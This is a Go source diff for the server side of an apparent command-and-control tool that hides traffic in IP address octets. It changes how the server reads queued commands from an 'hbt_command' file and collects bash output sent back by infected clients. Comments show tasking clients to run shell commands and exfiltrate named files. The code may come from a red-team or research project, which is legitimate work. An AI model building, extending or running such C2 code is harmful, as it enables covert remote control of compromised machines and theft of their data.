@@ -20,9 +20,16 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 	var bytes []byte
 	var c2_command string = ""
 
+	// Each time a heartbeat is received, check the "hbt_command" file.
+	current_hbt_command, err := os.ReadFile("hbt_command")
+	if err != nil {
+		fmt.Println(err)
+	}
+
 	// Specify what the client should do on the next connection to this server
-	// Ex:	cmd.exfil-single.test.txt specifies that the client should exfiltrate (exf) the file test.txt to the server.
-	c2_mappings := map[string]string{"hbt": "cmd-bash-ls"}
+	// Ex:	cmd-exfil-single.test.txt specifies that the client should exfiltrate (exf) the file test.txt to the server.
+	// If the client is sending two different kinds of heartbeats/commands, then additional mappings can be defined here.
+	c2_mappings := map[string]string{"hbt": string(current_hbt_command)}
 
 	// If the first octet is equal to "172" or "185", the operation is setting the mode and current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
@@ -70,17 +77,17 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 			if *c && command != "fin" && command != "beg" {
 				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
 				*lsb = append((*lsb), []byte(command)...)
-			}
-
-			switch command {
-			case "beg": // Begin collecting the output bytes of the bash command
-				*c = true
-			case "fin": // Finish collecting the output bytes of the bash command, and output the gathered data.
-				fmt.Printf("~$ %v", string(*lsb))
-				*lsb = []byte{}
-				*c = false
-			default: // Otherwise, return the c2 command outlined in the c2_mappings map.
-				c2_command = c2_mappings[command]
+			} else {
+				switch command {
+				case "beg": // Begin collecting the output bytes of the bash command
+					*c = true
+				case "fin": // Finish collecting the output bytes of the bash command, and output the gathered data.
+					fmt.Printf("~$ %v", string(*lsb))
+					*lsb = []byte{}
+					*c = false
+				default: // Otherwise, return the c2 command outlined in the c2_mappings map.
+					c2_command = c2_mappings[command]
+				}
 			}
 		}
 	}
